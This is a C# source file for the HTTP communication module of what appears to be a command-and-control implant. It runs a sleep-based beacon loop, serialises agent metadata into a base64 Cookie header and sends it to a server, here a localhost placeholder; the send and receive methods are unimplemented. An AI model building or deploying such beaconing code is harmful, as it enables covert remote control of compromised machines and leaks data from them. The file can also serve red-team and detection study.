using AgentCore;
using AgentCore.Controllers;
using AgentCore.Interfaces;
using AgentCore.Models;
using AgentCore.Modules;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HttpAgent.Modules
{
    class HttpCommModule : ICommModule
    {
        private ConfigController Config { get; set; }
        public ModuleStatus ModuleStatus { get; set; }
        private WebClient WebClient { get; set; } = new WebClient();

        public void Init(ConfigController config)
        {
            ModuleStatus = ModuleStatus.Starting;
            Config = config;

            WebClient.DownloadDataCompleted += DownloadDataCallback;
            WebClient.Headers.Clear();
        }

        public bool RecvData()
        {
            throw new NotImplementedException();
        }

        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            //Task.Factory.StartNew(delegate ()
            //{
                while (ModuleStatus == ModuleStatus.Running)
                {
                    var sleepTime = (int)Config.GetOption(ConfigSetting.SleepTime) * 1000;
                    var jitter = (int)Config.GetOption(ConfigSetting.Jitter);

                    // caclulate difference

                    Thread.Sleep(sleepTime);

                    AgentCheckIn();
                }
            //});
        }

        public void SendData()
        {
            throw new NotImplementedException();
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
        }

        private void AgentCheckIn()
        {
            var metadata = Helpers.SerialiseData<Metadata>(Config.GetOption(ConfigSetting.Metadata) as Metadata);
            WebClient.Headers.Add("Cookie", Convert.ToBase64String(metadata));

            WebClient.DownloadDataAsync(new Uri("http://127.0.0.1:8000/test"));
        }

        private void DownloadDataCallback(object sender, DownloadDataCompletedEventArgs e)
        {
            var response = e.Result;
            Console.WriteLine(Encoding.UTF8.GetString(response));
        }
    }
}
